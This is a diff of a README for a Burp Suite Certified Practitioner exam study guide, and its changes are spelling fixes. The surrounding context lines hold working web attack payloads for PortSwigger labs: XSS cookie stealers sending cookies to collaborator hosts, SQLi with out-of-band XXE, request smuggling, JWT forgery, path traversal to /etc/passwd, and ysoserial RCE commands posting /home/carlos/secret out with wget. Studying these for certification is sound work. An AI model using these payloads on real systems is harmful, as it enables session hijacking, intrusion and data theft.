@@ -31,7 +31,7 @@
 **[Appendix](#appendix)**  
 [Solve Labs with Python](#solve-labs-with-python)  
 [Payloads](payloads/README.md)  
-[Wordlists](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/wordlists)  
+[Word lists](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/wordlists)  
 [Focus target scanning](#focus-scanning)  
 [Approach](#approach)  
 [Youtube Study Playlist](#youtube-training-playlist)  
@@ -198,7 +198,7 @@
 
 + [CSP Evaluator](https://csp-evaluator.withgoogle.com/)  
   
->Set a test unsecure cookie in browser dev tools to test POC XSS cookie stealer payload on myself.  
+>Set a unsecured test cookie in browser using DEV tools console to use during test for POC XSS cookie stealer payload on myself.  
 
 ```JavaScript
 document.cookie = "TopSecret=UnsecureCookieValue4Peanut2019";
@@ -358,7 +358,7 @@ fuzzer\';alert(`Testing The backtick a typographical mark used mainly in computi
 \';document.location=`https://COLLABORATOR.com/?BackTicks=`+document.cookie;//
 ```  
 
->With help from Trevor I made this into cookie stealer payload, using backticks. Thanks Trevor, here is his youtube time index = [TJCHacking XSS string escape](https://youtu.be/Aqfl2Rj0qlU?t=598)  
+>With help from Trevor I made this into cookie stealer payload, using back ticks. Thanks Trevor, here is his Youtube time index = [TJCHacking XSS string escape](https://youtu.be/Aqfl2Rj0qlU?t=598)  
   
 ![fail-escape](images/fail-escape.png)  
   
@@ -422,7 +422,7 @@ ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20v
 ```
 ![(Deliver reflected xss to steal victim cookie.](images/xss1.png)  
 
->Decode above payload from url encoding, is the following:  
+>Decode above payload from URL encoding, is the following:  
 
 ```html
 https://TARGET.net/?SearchTerm="+eval(atob("ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20vP2M9IiArIGJ0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//  
@@ -453,7 +453,7 @@ https://TARGET.net/?SearchTerm="+eval(atob("fetch("https://COLLABORATOR.NET/?c="
 
 ![Identify-stored-xss](images/identify-stored-xss.png)  
 
->Cross site Scriting saved in Blog post comment. This Cookie Stealer payload then send the victim session cookie to the exploit server logs.  
+>Cross site Scripting saved in Blog post comment. This Cookie Stealer payload then send the victim session cookie to the exploit server logs.  
 
 ```html
 <img src="1" onerror="window.location='https://exploit.net/cookie='+document.cookie">
@@ -473,7 +473,7 @@ document.write('<img src="https://exploit.net?cookieStealer='+document.cookie+'"
 </script>
 ```  
 
->Below target has a stored XSS vulnerability in the blog comments function. Exfiltrate a victim user session cookie that views comments after they are posted, and then use their cookie to do impersonation.  
+>Below target has a stored XSS vulnerability in the blog comments function. Ex-filtrate a victim user session cookie that views comments after they are posted, and then use their cookie to do impersonation.  
 
 ![Stored XSS Blog post](images/stored-xss-blog-post.png)  
 
@@ -549,7 +549,7 @@ GET /?utm_content='/><script>document.location="https://Collaborator.com?c="+doc
 
 ### Poison ambiguous request  
 
->Adding a second **Host** header with an exploit server, this identify a ambiguous cache vulnerability and routing your request. Notice thast the exploit server in second **Host** header is reflected in an absolute URL used to import a script from ```/resources/js/tracking.js```. 
+>Adding a second **Host** header with an exploit server, this identify a ambiguous cache vulnerability and routing your request. Notice that the exploit server in second **Host** header is reflected in an absolute URL used to import a script from ```/resources/js/tracking.js```. 
 
 ```html
 GET / HTTP/1.1
@@ -573,7 +573,7 @@ document.location='https://Collaborator.com/?cookies='+document.cookie;
 
 >***Identify*** that altered HOST headers are supported, which allows you to spoof your IP address and bypass the IP-based brute-force protection or redirection attacks to do password reset poisoning.  
   
->Change the username parameter to carlos and send the request.  
+>Change the username parameter to Carlos and send the request.  
 
 ```html
 X-Forwarded-Host: EXPLOIT.net
@@ -621,7 +621,7 @@ csrf=TheCSRFTokenValue&username=carlos
 
 ## HTTP Request Smuggling  
 
->Architecture with front-end and back-end server, and front-end or backend does not support chunked encoding **(HEX)** or content-length **(Decimal)**. Bypass security controls to retrieve the victim's request and use the victim user's cookies to access their account.  
+>Architecture with front-end and back-end server, and front-end or back-end does not support chunked encoding **(HEX)** or content-length **(Decimal)**. Bypass security controls to retrieve the victim's request and use the victim user's cookies to access their account.  
 
 ### TE.CL multiCase - Transfer-Encoding
   
@@ -650,7 +650,7 @@ x=1
 
 >**Note:** include the trailing sequence \r\n\r\n following the final 0.  
 
->Calculating TE.CL (Transfer-Encoding / Content-Length) smuggle request length in **HEXADECIMAL** and the payload is between the hex length of **71** and the terminating **ZERO**, not including the ZERO AND not the preceding \r\n on line above ZERO, as part of length. The inital POST request **content-length** is manually set.  
+>Calculating TE.CL (Transfer-Encoding / Content-Length) smuggle request length in **HEXADECIMAL** and the payload is between the hex length of **71** and the terminating **ZERO**, not including the ZERO AND not the preceding \r\n on line above ZERO, as part of length. The initial POST request **content-length** is manually set.  
   
 [TJCHacking - Request Smuggling Calculator](https://github.com/tjcim/request_smuggling_calculator)  
   
@@ -865,11 +865,11 @@ Sec-Ch-Ua-Platform: "Linux"
 
 ### Stay-Logged-in  
 
->Login option with a stay-logged-in checkbox result in Cookie value containing the password of the user logged in and is vulnerable to brute-forcing.  
+>Login option with a stay-logged-in check-box result in Cookie value containing the password of the user logged in and is vulnerable to brute-forcing.  
 
 ![stay-logged-in](images/stay-logged-in.png)  
 
->Intruder Payload processing, add grep option and the following rules in sequenctial order before attack is submitted.  
+>Intruder Payload processing, add GREP option and the following rules in sequential order before attack is submitted.  
   
 1. Hash: MD5  
 2. Add prefix: carlos:  
@@ -885,7 +885,7 @@ grep 'Update email'
   
 ### Brute Force Protected Login  
 
->***Identified*** brute force protection on login when backend enforce 30 minute ban, resulting in **IP blocked** after too many invalid login attempts. Testing ```X-Forwarded-For:``` header result in bypass of brute force protection. Observing the response time with long invalid password, mean we can use **Pitchfork** technique to identify first valid usernames with random long password and then rerun intruder with **Pitchfork**, set each payload position attack iterates through all sets simultaneously.  
+>***Identified*** brute force protection on login when back-end enforce 30 minute ban, resulting in **IP blocked** after too many invalid login attempts. Testing ```X-Forwarded-For:``` header result in bypass of brute force protection. Observing the response time with long invalid password, mean we can use **Pitchfork** technique to identify first valid usernames with random long password and then rerun intruder with **Pitchfork**, set each payload position attack iterates through all sets simultaneously.  
 
 [Burp Lab Username, Password and directory fuzzing Wordlists](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/wordlists)  
 
@@ -915,7 +915,7 @@ X-Forwarded-For: 12.13.14.15
   
 ## PrivEsc JSON RoleId  
 
->Access control to the admin interface is based on user roles, and this can lead to privilege escalation or accessc ontrol security vulnerability.  
+>Access control to the admin interface is based on user roles, and this can lead to privilege escalation or access control security vulnerability.  
 
 >Capture current logged in user email change submission request and send to **Intruder**, then add ```"roleid":§99§``` into the JSON body of the request, and fuzz the possible roleid value for administrator access role.  
 
@@ -938,7 +938,7 @@ Connection: close
 
 ![Intruder Payload set to identify Admin role ID](images/intruder-payload-positions.png)  
 
->Attacker ***identify*** the possible role ID of administrator role and then send this request with updated roleId to privilege escalate the current logged in user to the access role of administator.  
+>Attacker ***identify*** the possible role ID of administrator role and then send this request with updated roleId to privilege escalate the current logged in user to the access role of administrator.  
 
 ![Attack identify Admin role ID](images/admin-roleid-privesc.png)  
 
@@ -1091,7 +1091,7 @@ csrf=TOKEN&username=administrator
 
 >Error based or Blind SQL injection vulnerabilities, allow SQL queries in an application to be used to extract data or login credentials from the  database. SQLMAP is used to fast track the exploit and retrieve the sensitive information.  
 
->To identify SQLi, by adding a double (") or single quote (') to web parameters or tracking cookies can break the SQL syntax resulting in error message, and postive SQL injection identification.  
+>***Identify*** SQLi, by adding a double (") or single quote (') to web parameters or tracking cookies, if this break the SQL syntax resulting in error message response, then positive SQL injection identified.  
 
 [SQL Injection cheat sheet examples](https://portswigger.net/web-security/sql-injection/cheat-sheet)  
 
@@ -1111,7 +1111,7 @@ TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encod
   
 >The SQL payload above can also be used to extract the Administrator password for the this [PortSwigger Lab: Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors) challenge.  
 
->Below SQL payload only makes call to collaboration server but no data is exfiltrated.  
+>Below SQL payload only makes call to collaboration server but no data is ex-filtrated.  
 
 ```sql
 TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//COLLABORATOR.NET/">+%25remote%3b]>'),'/l')+FROM+dual--
@@ -1147,7 +1147,7 @@ TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encod
 
 ![sqli conditional response](images/sqli-conditional-response.png)  
 
->Alterative use a **cluster bomb** attack and setting **two** payload positions, first one for the character position with a payload of numbers ```1..20``` and the second position, using alpha and number characters, this will iterate through each permutation of payload combinations.  
+>Alternative use a **cluster bomb** attack and setting **two** payload positions, first one for the character position with a payload of numbers ```1..20``` and the second position, using alpha and number characters, this will iterate through each permutation of payload combinations.  
 
 ![cluster bomb](images/cluster-bomb.png)  
 
@@ -1247,7 +1247,7 @@ sqlmap -v -u 'https://TARGET.net/filter?category=*' -p 'category' --batch --flus
 
 ### JWT bypass via JWK  
 
->The burp scannner ***identify*** vulnerability in server as, **JWT self-signed JWK header supported**. Possible to exploit it through failed check of the provided key source. Exploit steps:  
+>The burp scanner ***identify*** vulnerability in server as, **JWT self-signed JWK header supported**. Possible to exploit it through failed check of the provided key source. Exploit steps:  
 
 1. New RSA Key  
 2. In request JWT payload, change the value of the **sub claim** to administrator  
@@ -1272,7 +1272,7 @@ hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
 
 ### JWT kid header  
 
->JWT-based mechanism for handling sessions. In order to verify the signature, the server uses the **kid** parameter in JWT header to fetch the relevant key from its filesystem. Generate a new **Symmetric Key** and replace **k** property with base64 null byte **AA==**, to be used when signing the JWT.  
+>JWT-based mechanism for handling sessions. In order to verify the signature, the server uses the **kid** parameter in JWT header to fetch the relevant key from its file system. Generate a new **Symmetric Key** and replace **k** property with base64 null byte **AA==**, to be used when signing the JWT.  
 
 >JWS  
 
@@ -1339,7 +1339,7 @@ hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
   
 ### Original URL  
 
->Admin portal only accessable from internal. Identify if access control can be bypassed using header ```X-Original-URL```, observe different response to ```/admin``` endpoint requests depending on header value.  
+>Admin portal only accessible from internal. Identify if access control can be bypassed using header ```X-Original-URL```, observe different response to ```/admin``` endpoint requests depending on header value.  
 
 ```
 X-Original-URL: /admin
@@ -1536,7 +1536,7 @@ Cookie: session=PQcb5CMC9ECh5fBobuxSalaBdxyLis01
   
 ### SSRF redirect_uris  
 
->POST request to register data to the client application with redirect URL endpoint in JSON body. Provide a redirect_uris array containing an arbitrary whitelist of callback URIs. Observe the redirect_uri.  
+>POST request to register data to the client application with redirect URL endpoint in JSON body. Provide a redirect_uris array containing an arbitrary white-list of callback URIs. Observe the redirect_uri.  
 
 ```html
 POST /reg HTTP/1.1
@@ -1580,7 +1580,7 @@ Content-Length: 206
   
 ### HOST Routing-based SSRF  
 
->***Identify*** routing-based SSRF by altering the **host** header on request and observe the response. Routing-based SSRF via the Host header allow insecure access to a localhost intranet.  
+>***Identify*** routing-based SSRF by altering the **host** header on request and observe the response. Routing-based SSRF via the Host header allow insecure access to a localhost Intranet.  
 
 ```
 GET / HTTP/1.1
@@ -1684,7 +1684,7 @@ hacktricks xss cross site scripting server side xss dynamic pdf
 
 ### SSRF Open Redirection  
 
->The target make **GET** request to the ***next product*** on the ecommerce site, using a **path** parameter. On the stockAPI POST request the value provided in body data is the partial path to interal system. The ***identification*** of this vulnerability is by testing various paths and observing the input path specified is reflected in the response **Location** header.  
+>The target make **GET** request to the ***next product*** on the e-commerce site, using a **path** parameter. On the stockAPI POST request the value provided in body data is the partial path to internal system. The ***identification*** of this vulnerability is by testing various paths and observing the input path specified is reflected in the response **Location** header.  
 
 ![SSRF Open Redirect Location reflect](images/ssrf-open-edirect-location-reflect.png)  
 
@@ -1847,7 +1847,7 @@ wrtz{{#with "s" as |string|}}
 4. Leading the begining of the called filename with the original path and then appending ```/var/www/images/../../../etc/passwd``` payload at end bypasses the protection.  
 5. Using a **null** byte charater at end plus an image extension to fool app controls that an image is requested, this ```../../../etc/passwd%00.png``` payload succeed.  
   
->Corresponding Directory travelsal labs.
+>Corresponding Directory traversal labs.
 
 1. [PortSwigger Lab: File path traversal, traversal sequences blocked with absolute path bypass](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)  
 2. [PortSwigger Lab: File path traversal, traversal sequences stripped non-recursively](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)  
@@ -1865,7 +1865,7 @@ wrtz{{#with "s" as |string|}}
 GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
 ```  
 
->Note: Add the fuzzing path traversal payload from dropdown list option, **"Add from list ..."**. Then set processing rule on the provided payload to replace the FILE place holder with regex ```\{FILE\}``` for each of the attacks.  
+>Note: Add the fuzzing path traversal payload from drop-down list option, **"Add from list ..."**. Then set processing rule on the provided payload to replace the FILE place holder with reg-ex ```\{FILE\}``` for each of the attacks.  
 
 ![payloads for path traverse](images/payloads-for-path-traverse.png)  
 
@@ -1958,7 +1958,7 @@ O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
 
 ![Admin prefs serial cookie](images/admin-prefs-serial-cookie.png)  
 
->Use below payload in the Deserialization scanner exploiting java jar ysoserial command, to obtain remote code execution (RCE) when payload deserialized on target.  
+>Use below payload in the Deserialization scanner exploiting Java jar ysoserial command, to obtain remote code execution (RCE) when payload de-serialized on target.  
  
 ```
 CommonsCollections3 'wget http://Collaborator.net --post-file=/home/carlos/secret'
@@ -1976,7 +1976,7 @@ java -jar /opt/ysoserial/ysoserial.jar CommonsCollections4 'wget http://Collabor
   
 # Appendix  
 
->This section contain **additional** information to solving the Portswigger labs and approaching the BSCP exam, such as the youtube content creators, Burp speed scanning technique, and python automated scripts I copied from [TJCHacking](https://www.youtube.com/@tjchacking/videos).  
+>This section contain **additional** information to solving the PortSwigger labs and approaching the BSCP exam, such as the Youtube content creators, Burp speed scanning technique, python automated scripts I created by following [TJCHacking](https://www.youtube.com/@tjchacking/videos).  
 
 ## Solve Labs with Python  
 
@@ -2009,7 +2009,7 @@ java -jar /opt/ysoserial/ysoserial.jar CommonsCollections4 'wget http://Collabor
 ## Approach  
 
 >If stuck in BSCP exam, then use [Micah van Deusen blog tip 5 table of category to stages](https://micahvandeusen.com/burp-suite-certified-practitioner-exam-review/) for ways to progress through the stages.  
->This is my personal view of the possible approach to leverage identified vulnerabilites and then using these notes to progress through the BSCP exam stages.  
+>This is my personal view of the possible approach to leverage identified vulnerabilities and then using these notes to progress through the BSCP exam stages.  
 
 ![Three stages](images/3stages.png)  
 
@@ -2042,4 +2042,4 @@ Youtube channels:
 
 >This PortSwigger exam is designed to be challenging, it is not straight forward vulnerabilities, twisted challenges, mixed academy labs into single problem and even rabbit holes.  
 >**Perseverance:** Persistence in doing something despite difficulty or delay in achieving success.  
->**OSCP** certification learned me to **#TryHarder** and gave me the foundation penetration testing skills, but I believe the **BSCP** will give me the next level of web application pentest knowledge.  
+>**OSCP** certification learned me to **#TryHarder** and gave me the foundation penetration testing skills, but I believe the **BSCP** will give me the next level of web application pen-test knowledge.  
